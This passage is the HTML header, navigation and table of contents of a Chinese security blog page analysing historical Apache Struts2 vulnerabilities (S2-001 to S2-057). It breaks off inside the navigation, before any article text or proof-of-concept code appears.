<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="happy hunting bugs"><meta name=author content=wh1t3p1g><link href=https://blog.0kami.cn/blog/2020/talk_about_struts2/ rel=canonical><link rel=icon href=../../../assets/images/favicon.png><meta name=generator content="mkdocs-1.3.1, mkdocs-material-8.4.2"><title>struts2历史漏洞分析 - wh1t3p1g's blog</title><link rel=stylesheet href=../../../assets/stylesheets/main.69437709.min.css><link rel=stylesheet href=../../../assets/stylesheets/palette.cbb835fc.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><link rel=stylesheet href=../../../stylesheets/extra.css><script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme data-md-color-primary=none data-md-color-accent=none> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#0x00 class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=页眉> <a href=../../.. title="wh1t3p1g's blog" class="md-header__button md-logo" aria-label="wh1t3p1g's blog" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> wh1t3p1g's blog </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> struts2历史漏洞分析 </span> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=查找> <button type=reset class="md-search__icon md-icon" aria-label=清空当前内容 tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/wh1t3p1g title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><!-- Font Awesome Free 6.1.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> GitHub </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=标签 data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../.. class=md-tabs__link> Home </a> </li> <li class=md-tabs__item> <a href=../../2021/how_to_find_gadget_chains/ class="md-tabs__link md-tabs__link--active"> Blog </a> </li> <li class=md-tabs__item> <a href=../../../writeups/2020/xnuca-2020-easyjava/ class=md-tabs__link> Writeups </a> </li> <li class=md-tabs__item> <a href=../../../about/ class=md-tabs__link> About Me </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=导航栏 data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../.. title="wh1t3p1g's blog" class="md-nav__button md-logo" aria-label="wh1t3p1g's blog" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg> </a> wh1t3p1g's blog </label> <div class=md-nav__source> <a href=https://github.com/wh1t3p1g title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><!-- Font Awesome Free 6.1.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> GitHub </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../.. class=md-nav__link> Home </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2 checked> <label class=md-nav__link for=__nav_2> Blog <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Blog data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle=__nav_2_1 type=checkbox id=__nav_2_1 checked> <label class=md-nav__link for=__nav_2_1> 2021 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2021 data-md-level=2> <label class=md-nav__title for=__nav_2_1> <span class="md-nav__icon md-icon"></span> 2021 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2021/how_to_find_gadget_chains/ class=md-nav__link> 如何高效的挖掘Java反序列化利用链？ </a> </li> <li class=md-nav__item> <a href=../../2021/how_to_find_gadget_chains_2/ class=md-nav__link> 如何高效地捡漏反序列化利用链？ </a> </li> <li class=md-nav__item> <a href=../../2021/xstream_blacklist_bypass/ class=md-nav__link> XStream 1.4.15 Blacklist Bypass </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2 type=checkbox id=__nav_2_2 checked> <label class=md-nav__link for=__nav_2_2> 2020 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2020 data-md-level=2> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> 2020 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../java-jmx-rmi-20200310/ class=md-nav__link> 攻击Java JMX-RMI </a> </li> <li class=md-nav__item> <a href=../jndi-with-ldap-20200301/ class=md-nav__link> JNDI with LDAP </a> </li> <li class=md-nav__item> <a href=../jndi-with-rmi-20200209/ class=md-nav__link> JNDI with RMI </a> </li> <li class=md-nav__item> <a href=../rmi-registry-security-problem-20200206/ class=md-nav__link> 浅谈Java RMI Registry安全问题 </a> </li> <li class=md-nav__item> <a href=../talk-about-fastjson-deserialization-20200413/ class=md-nav__link> 浅谈fastjson反序列化漏洞 </a> </li> <li class=md-nav__item> <a href=../talk-about-xstream-deserialization-20200418/ class=md-nav__link> 回顾XStream反序列化漏洞 </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> struts2历史漏洞分析 <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> struts2历史漏洞分析 </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#0x00 class=md-nav__link> 0x00 前言 </a> </li> <li class=md-nav__item> <a href=#0x01 class=md-nav__link> 0x01 基础 </a> </li> <li class=md-nav__item> <a href=#0x02 class=md-nav__link> 0x02 历史版本回顾 </a> <nav class=md-nav aria-label="0x02 历史版本回顾"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1-s2-001 class=md-nav__link> 1. S2-001 </a> <nav class=md-nav aria-label="1. S2-001"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 漏洞分析 </a> </li> <li class=md-nav__item> <a href=#poc class=md-nav__link> 回显POC </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2-s2-003 class=md-nav__link> 2. S2-003 </a> <nav class=md-nav aria-label="2. S2-003"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 漏洞分析 </a> </li> <li class=md-nav__item> <a href=#poc_1 class=md-nav__link> POC分析 </a> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#3-s2-005 class=md-nav__link> 3. S2-005 </a> <nav class=md-nav aria-label="3. S2-005"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_2 class=md-nav__link> POC分析 </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#4-s2-007 class=md-nav__link> 4. S2-007 </a> <nav class=md-nav aria-label="4. S2-007"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_3 class=md-nav__link> POC </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#5-s2-008 class=md-nav__link> 5. S2-008 </a> <nav class=md-nav aria-label="5. S2-008"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#cookieinterceptor class=md-nav__link> CookieInterceptor </a> </li> <li class=md-nav__item> <a href=#debugginginterceptor class=md-nav__link> DebuggingInterceptor </a> </li> <li class=md-nav__item> <a href=#poc_4 class=md-nav__link> POC </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#6-s2-009 class=md-nav__link> 6. S2-009 </a> <nav class=md-nav aria-label="6. S2-009"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_5 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#7-s2-012 class=md-nav__link> 7. S2-012 </a> <nav class=md-nav aria-label="7. S2-012"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 修复 </a> </li> <li class=md-nav__item> <a href=#poc_6 class=md-nav__link> POC </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#8-s2-013s2-014 class=md-nav__link> 8. S2-013/S2-014 </a> <nav class=md-nav aria-label="8. S2-013/S2-014"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_7 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#9-s2-015 class=md-nav__link> 9. S2-015 </a> <nav class=md-nav aria-label="9. S2-015"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_8 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_9 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#10-s2-016 class=md-nav__link> 10. S2-016 </a> <nav class=md-nav aria-label="10. S2-016"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_9 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_10 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#11-s2-019 class=md-nav__link> 11. S2-019 </a> <nav class=md-nav aria-label="11. S2-019"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_10 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#12-s2-029s2-036 class=md-nav__link> 12. S2-029/S2-036 </a> <nav class=md-nav aria-label="12. S2-029/S2-036"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_11 class=md-nav__link> POC </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#s2-029 class=md-nav__link> 修复S2-029 </a> </li> <li class=md-nav__item> <a href=#13-s2-032s2-033s2-037 class=md-nav__link> 13. S2-032/S2-033/S2-037 </a> <nav class=md-nav aria-label="13. S2-032/S2-033/S2-037"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_12 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#s2-032s2-033 class=md-nav__link> S2-032/S2-033修复 </a> </li> <li class=md-nav__item> <a href=#s2-037 class=md-nav__link> S2-037修复 </a> </li> <li class=md-nav__item> <a href=#_12 class=md-nav__link> 一个有意思的地方 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#14-s2-045s2-046 class=md-nav__link> 14. S2-045/S2-046 </a> <nav class=md-nav aria-label="14. S2-045/S2-046"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_13 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> 修复 </a> </li> <li class=md-nav__item> <a href=#15-s2-048 class=md-nav__link> 15. S2-048 </a> </li> <li class=md-nav__item> <a href=#16-s2-052 class=md-nav__link> 16. S2-052 </a> <nav class=md-nav aria-label="16. S2-052"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_14 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_14 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#17-s2-053 class=md-nav__link> 17. S2-053 </a> <nav class=md-nav aria-label="17. S2-053"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_15 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_15 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#18-s2-055 class=md-nav__link> 18. S2-055 </a> </li> <li class=md-nav__item> <a href=#19-s2-057 class=md-nav__link> 19. S2-057 </a> <nav class=md-nav aria-label="19. S2-057"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_16 class=md-nav__link> POC </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#0x03 class=md-nav__link> 0x03 总结 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle=__nav_2_3 type=checkbox id=__nav_2_3 checked> <label class=md-nav__link for=__nav_2_3> 2019 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2019 data-md-level=2> <label class=md-nav__title for=__nav_2_3> <span class="md-nav__icon md-icon"></span> 2019 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2019/mycncart-v2-0-0-3-sqli-20190225/ class=md-nav__link> mycncart sqli </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-commonscollections3-1-20191024/ class=md-nav__link> Java反序列化利用链挖掘之CommonsCollections1 </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-commonscollections3-3-20191028/ class=md-nav__link> Java反序列化利用链挖掘之CommonsCollections3 </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-commonscollections3-others-20191031/ class=md-nav__link> Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10 </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-commonscollections4-20191105/ class=md-nav__link> Java反序列化利用链挖掘之CommonsCollections2,4,8 </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-shiro-1-2-4-20191110/ class=md-nav__link> Java反序列化利用链挖掘之Shiro反序列化 </a> </li> <li class=md-nav__item> <a href=../../2019/temmoku-t1-15-sqli-20190221/ class=md-nav__link> temmoku home版 t1.15 前台sqli </a> </li> <li class=md-nav__item> <a href=../../2019/thinkphp-v5.x-App.php-rce/ class=md-nav__link> thinkphp v5.x App.php s参数RCE </a> </li> <li class=md-nav__item> <a href=../../2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/ class=md-nav__link> thinkphp v5.2.x 反序列化利用链挖掘 </a> </li> <li class=md-nav__item> <a href=../../2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/ class=md-nav__link> thinkphp v6.0.x 反序列化利用链挖掘 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle=__nav_2_4 type=checkbox id=__nav_2_4 checked> <label class=md-nav__link for=__nav_2_4> 2018 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2018 data-md-level=2> <label class=md-nav__title for=__nav_2_4> <span class="md-nav__icon md-icon"></span> 2018 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2018/MovieGuide2SQLi-20180203/ class=md-nav__link> MovieGuide v2.0 SQLi </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle=__nav_2_5 type=checkbox id=__nav_2_5 checked> <label class=md-nav__link for=__nav_2_5> 2017 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2017 data-md-level=2> <label class=md-nav__title for=__nav_2_5> <span class="md-nav__icon md-icon"></span> 2017 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2017/bluecms-v1-6-Sql-Injection/ class=md-nav__link> bluecms v1.6 Sql Injection 分析 </a> </li> <li class=md-nav__item> <a href=../../2017/old-DM-sql-injection/ class=md-nav__link> DM企业建站系统前台盲注 </a> </li> <li class=md-nav__item> <a href=../../2017/old-seacms-v6-5-getshell/ class=md-nav__link> seacms v6.5 前台getshell </a> </li> <li class=md-nav__item> <a href=../../2017/struts2-history-payload/ class=md-nav__link> Struts2命令执行各版本记录 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle=__nav_2_6 type=checkbox id=__nav_2_6 checked> <label class=md-nav__link for=__nav_2_6> 2016 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2016 data-md-level=2> <label class=md-nav__title for=__nav_2_6> <span class="md-nav__icon md-icon"></span> 2016 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2016/old-cve-2016-6663-mysql-exp/ class=md-nav__link> MYSQL提权分析 </a> </li> <li class=md-nav__item> <a href=../../2016/old-dirtycow-cve-2016-5195/ class=md-nav__link> CVE-2016-5195 Dirtycow </a> </li> <li class=md-nav__item> <a href=../../2016/old-wordpress-ssrf-4-4-2/ class=md-nav__link> wordpress SSRF <4.5 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle=__nav_3 type=checkbox id=__nav_3 checked> <label class=md-nav__link for=__nav_3> Writeups <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Writeups data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Writeups </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle=__nav_3_1 type=checkbox id=__nav_3_1 checked> <label class=md-nav__link for=__nav_3_1> 2020 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2020 data-md-level=2> <label class=md-nav__title for=__nav_3_1> <span class="md-nav__icon md-icon"></span> 2020 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../writeups/2020/xnuca-2020-easyjava/ class=md-nav__link> xnuca2020 easyjava设计思路 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle=__nav_3_2 type=checkbox id=__nav_3_2 checked> <label class=md-nav__link for=__nav_3_2> 2018 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2018 data-md-level=2> <label class=md-nav__title for=__nav_3_2> <span class="md-nav__icon md-icon"></span> 2018 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../writeups/2018/ddctf-web-writeup-20180421/ class=md-nav__link> DDCTF 2018 web writeup </a> </li> <li class=md-nav__item> <a href=../../../writeups/2018/hitb-xctf-2018-portion-web-writeup-20180415/ class=md-nav__link> HITB-XCTF 2018 web writeup </a> </li> <li class=md-nav__item> <a href=../../../writeups/2018/old-python-sandbox-escape/ class=md-nav__link> python sandbox escape </a> </li> <li class=md-nav__item> <a href=../../../writeups/2018/suctf-part-web-writeup-20180528/ class=md-nav__link> SUCTF 2018 部分web writeup </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../about/ class=md-nav__link> About Me </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#0x00 class=md-nav__link> 0x00 前言 </a> </li> <li class=md-nav__item> <a href=#0x01 class=md-nav__link> 0x01 基础 </a> </li> <li class=md-nav__item> <a href=#0x02 class=md-nav__link> 0x02 历史版本回顾 </a> <nav class=md-nav aria-label="0x02 历史版本回顾"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1-s2-001 class=md-nav__link> 1. S2-001 </a> <nav class=md-nav aria-label="1. S2-001"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 漏洞分析 </a> </li> <li class=md-nav__item> <a href=#poc class=md-nav__link> 回显POC </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2-s2-003 class=md-nav__link> 2. S2-003 </a> <nav class=md-nav aria-label="2. S2-003"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 漏洞分析 </a> </li> <li class=md-nav__item> <a href=#poc_1 class=md-nav__link> POC分析 </a> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#3-s2-005 class=md-nav__link> 3. S2-005 </a> <nav class=md-nav aria-label="3. S2-005"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_2 class=md-nav__link> POC分析 </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#4-s2-007 class=md-nav__link> 4. S2-007 </a> <nav class=md-nav aria-label="4. S2-007"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_3 class=md-nav__link> POC </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#5-s2-008 class=md-nav__link> 5. S2-008 </a> <nav class=md-nav aria-label="5. S2-008"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#cookieinterceptor class=md-nav__link> CookieInterceptor </a> </li> <li class=md-nav__item> <a href=#debugginginterceptor class=md-nav__link> DebuggingInterceptor </a> </li> <li class=md-nav__item> <a href=#poc_4 class=md-nav__link> POC </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#6-s2-009 class=md-nav__link> 6. S2-009 </a> <nav class=md-nav aria-label="6. S2-009"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc_5 class=md-nav__link> POC </a> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 修复 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#7-s2-012 class=md-nav__link> 7. S2-012 </a> <nav class=md-nav aria-label="7. S2-012"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 修复 </a> </li> <li class=md-nav__item> <a href=#poc_6 class=md-nav__link> POC </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#8-s2-013s2-014 class=md-nav__link> 8. S2-013/S2-014 </a> <nav class=md-nav aria-label="8. S2-013/S2-014"> <ul 